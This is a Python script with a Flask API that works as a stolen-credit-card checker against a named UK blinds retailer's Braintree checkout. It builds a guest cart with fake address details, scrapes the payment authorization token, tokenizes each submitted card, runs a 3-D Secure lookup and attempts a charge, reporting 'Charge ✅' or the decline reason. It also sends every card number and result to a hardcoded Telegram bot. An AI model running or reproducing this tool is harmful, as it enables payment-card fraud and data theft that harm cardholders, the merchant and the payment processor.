import requests,json,user_agent
import time,base64
r=requests.session()
times = int(time.time() * 1000)
ag=user_agent.generate_user_agent()
def creatph():

	url = "https://www.swiftdirectblinds.co.uk/checkout/"
	
	headers = {
	  'User-Agent': ag,
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'referer': "https://www.swiftdirectblinds.co.uk/checkout/cart/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
	}
	
	response = requests.get(url, headers=headers)
	
	m=(response.cookies['PHPSESSID'])
	
	
	url = "https://www.swiftdirectblinds.co.uk/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuc3dpZnRkaXJlY3RibGluZHMuY28udWsvcHJlbWllci1icmlnaHQtd2hpdGUtd29vZGVuLWJsaW5kLmh0bWw~/product/2781/"
	
	payload = {
	  'product': '2781',
	  'selected_configurable_option': '',
	  'related_product': '',
	  'item': '2781',
	  'form_key': 'z6YzfQ13XVOH3nhB',
	  'options[25577]': '70552',
	  'options[25574]': '70549',
	  'options[25575]': '40',
	  'options[25576]': '40',
	  'options[25579][]': '70555',
	  'options[25580][]': '70557',
	  'options[25583][]': '70568',
	  'options[25584][]': '70570',
	  'options[25581]': '',
	  'options[25582]': '',
	  'qty': '1'
	}
	
	headers = {
	  'User-Agent': ag,
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://www.swiftdirectblinds.co.uk",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.swiftdirectblinds.co.uk/premier-bright-white-wooden-blind.html",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "PHPSESSID="+m+"; form_key=z6YzfQ13XVOH3nhB; mage-cache-storage={}; form_key=z6YzfQ13XVOH3nhB; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}"
	}
	
	response = r.post(url, data=payload, headers=headers,cookies=r.cookies)
	
	
	
	url = "https://www.swiftdirectblinds.co.uk/customer/section/load/"
	
	params = {
	  'sections': "cart,directory-data,messages,apptrian_metapixelapi_matching_section",
	  'force_new_section_timestamp': "true",
	  '_': times
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.swiftdirectblinds.co.uk/premier-bright-white-wooden-blind.html",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "PHPSESSID="+m+"; form_key=z6YzfQ13XVOH3nhB; mage-cache-storage={}; form_key=z6YzfQ13XVOH3nhB; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}"
	}
	
	response = requests.get(url, params=params, headers=headers)
	
	uid=(response.text.split('braintree_masked_id')[1].split('"')[2])
	
	
	url = "https://www.swiftdirectblinds.co.uk/rest/en/V1/guest-carts/"+uid+"/shipping-information"
	
	payload = {
	  "addressInformation": {
	    "shipping_address": {
	      "countryId": "GB",
	      "region": "",
	      "street": [
	        "new york city ",
	        "hht"
	      ],
	      "telephone": "12015589645",
	      "postcode": "10090",
	      "city": "new york",
	      "firstname": "Mohamed",
	      "lastname": "Sarah"
	    },
	    "billing_address": {
	      "countryId": "GB",
	      "region": "",
	      "street": [
	        "new york city ",
	        "hht"
	      ],
	      "telephone": "12015589645",
	      "postcode": "10090",
	      "city": "new york",
	      "firstname": "Mohamed",
	      "lastname": "Sarah",
	      "saveInAddressBook": None
	    },
	    "shipping_method_code": "standard",
	    "shipping_carrier_code": "standard",
	    "extension_attributes": {
	      "delivery_instructions": "",
	      "is_subscribe": False
	    }
	  }
	}
	
	headers = {
	  'User-Agent': ag,
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://www.swiftdirectblinds.co.uk",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.swiftdirectblinds.co.uk/checkout/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	'Cookie': "PHPSESSID="+m+"; form_key=z6YzfQ13XVOH3nhB; mage-cache-storage={}; form_key=z6YzfQ13XVOH3nhB; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}"
	}
	
	response = r.post(url, data=json.dumps(payload), headers=headers,cookies=r.cookies)
	return uid,m
def chk(cc,exp,exy,cvc,uid,m):

	url = "https://www.swiftdirectblinds.co.uk/premier-bright-white-wooden-blind.html"
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'referer': "https://www.swiftdirectblinds.co.uk/blinds/wooden/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  
	}
	
	response = requests.get(url, headers=headers)
	
	aut=response.text.split('payPalBraintreeClientToken')[1].split('"')[2]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]
	
	
	url = "https://payments.braintree-api.com/graphql"
	
	payload = {
	  "clientSdkMetadata": {
	    "source": "client",
	    "integration": "custom",
	    "sessionId": "82c93796-a5c6-4ff0-8a99-63c62b67785d"
	  },
	  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
	  "variables": {
	    "input": {
	      "creditCard": {
	        "number": cc,
	        "expirationMonth": exp,
	        "expirationYear": "20"+exy,
	        "cvv": cvc
	      },
	      "options": {
	        "validate": False
	      }#
	    }
	  },
	  "operationName": "TokenizeCreditCard"
	}
	
	headers = {
	  'User-Agent': ag,
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'authorization': "Bearer "+auth,
	  'braintree-version': "2018-05-10",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://assets.braintreegateway.com",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://assets.braintreegateway.com/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
	}
	
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	
	token=(response.json()['data']['tokenizeCreditCard']['token'])
	
	url = "https://api.braintreegateway.com/merchants/98pqd6n4q5kxpv9s/client_api/v1/payment_methods/"+token+"/three_d_secure/lookup"
	
	payload = {
	  "amount": "15.95",
	  "browserColorDepth": 24,
	  "browserJavaEnabled": False,
	  "browserJavascriptEnabled": True,
	  "browserLanguage": "en-US",
	  "browserScreenHeight": 886,
	  "browserScreenWidth": 393,
	  "browserTimeZone": -180,
	  "deviceChannel": "Browser",
	  "additionalInfo": {
	    "shippingGivenName": "Mohamed",
	    "shippingSurname": "Sarah",
	    "shippingPhone": "12015589645",
	    "ipAddress": "156.203.107.2",
	    "billingLine1": "new york city ",
	    "billingLine2": "hht",
	    "billingCity": "new york",
	    "billingPostalCode": "10090",
	    "billingCountryCode": "GB",
	    "billingPhoneNumber": "12015589645",
	    "billingGivenName": "Mohamed",
	    "billingSurname": "Sarah",
	    "shippingLine1": "new york city ",
	    "shippingLine2": "hht",
	    "shippingCity": "new york",
	    "shippingPostalCode": "10090",
	    "shippingCountryCode": "GB"
	  },
	  "bin": "520524",
	  "cardAdd": False,
	  #"dfReferenceId": "0_6fef50bd-0794-407a-88d2-7d67542e631c",
	  "clientMetadata": {
	    "requestedThreeDSecureVersion": "2",
	    "sdkVersion": "web/3.112.0",
	    "cardinalDeviceDataCollectionTimeElapsed": 677,
	    "issuerDeviceDataCollectionTimeElapsed": 756,
	    "issuerDeviceDataCollectionResult": True
	  },
	  "authorizationFingerprint": auth,
	  "braintreeLibraryVersion": "braintree/web/3.112.0",
	  "_meta": {
	    "merchantAppId": "www.swiftdirectblinds.co.uk",
	    "platform": "web",
	    "sdkVersion": "3.112.0",
	    "source": "client",
	    "integration": "custom",
	    "integrationType": "custom",
	    "sessionId": "82c93796-a5c6-4ff0-8a99-63c62b67785d"
	  }
	}
	
	headers = {
	  'User-Agent': ag,
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-ch-ua-mobile': "?1",
	  'origin': "https://www.swiftdirectblinds.co.uk",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.swiftdirectblinds.co.uk/checkout/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
	}
	
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	re=(response.text)
	try:
		error=response.json()['error']['message']
		return error
	except:
		pass
	if 'authenticate_successful' in re or 'lookup_error' in re or 'authenticate_attempt_successful' in re:
		pass
	else:
		return re.split('"status":')[1].split('"')[1]
	nonce=(response.json()['paymentMethod']['nonce'])
	url = "https://www.swiftdirectblinds.co.uk/rest/en/V1/guest-carts/"+uid+"/payment-information"
	
	payload = {
	  "cartId": uid,
	  "billingAddress": {
	    "countryId": "GB",
	    "region": "",
	    "street": [
	      "new york city ",
	      "hht"
	    ],
	    "telephone": "12015589645",
	    "postcode": "10090",
	    "city": "new york",
	    "firstname": "Mohamed",
	    "lastname": "Sarah",
	    "saveInAddressBook": None
	  },
	  "paymentMethod": {
	    "method": "braintree",
	    "additional_data": {
	      "payment_method_nonce": nonce,
	      "device_data": "{\"correlation_id\":\"82c93796-a5c6-4ff0-8a99-63c62b67\"}"
	    }
	  },
	  "email": "aqga347@gmail.com"
	}
	
	headers = {
	  'User-Agent': ag,
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://www.swiftdirectblinds.co.uk",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.swiftdirectblinds.co.uk/checkout/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "PHPSESSID="+m+"; form_key=z6YzfQ13XVOH3nhB; mage-cache-storage={}; form_key=z6YzfQ13XVOH3nhB; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}"
	}
	
	response = r.post(url, data=json.dumps(payload), headers=headers,cookies=r.cookies)
	try:
		return response.text.split('Your payment could not be taken. Please try again or use a different payment method.')[1].split('"')[0]
	except:
		return "Charge ✅"

from flask import Flask, request, jsonify

app = Flask(__name__)

# الصفحة الرئيسية
@app.route('/')
def home():
    return jsonify({
        "status": True,
        "message": "Flask API Working"
    })


@app.route('/chk', methods=['GET'])
def run():
	c=request.args.get("cc")
	ke=request.args.get("key")
	if ke == 'A81JNW8819V':
		pass
	else:
		return False
	cc=c.split('|')[0]
	exp=c.split('|')[1]
	exy=c.split('|')[2]
	if '20' == exy[0]+exy[1]:
		exy=exy[2]+exy[3]
	cvc=c.split('|')[3]
	k=creatph()
	uid=k[0]
	m=k[1]
	re=chk(cc,exp,exy,cvc,uid,m)
	requests.get(
            f"https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage"
            f"?chat_id=6689099522&text={c}|{re}"
        )
	if "threshold" in re or "risk" in re:
		re="Proced Declined"
	return jsonify({
            "success": True,
            "card":c,
            "results": re
        })

def handler(environ, start_response):
    return app(environ, start_response)
    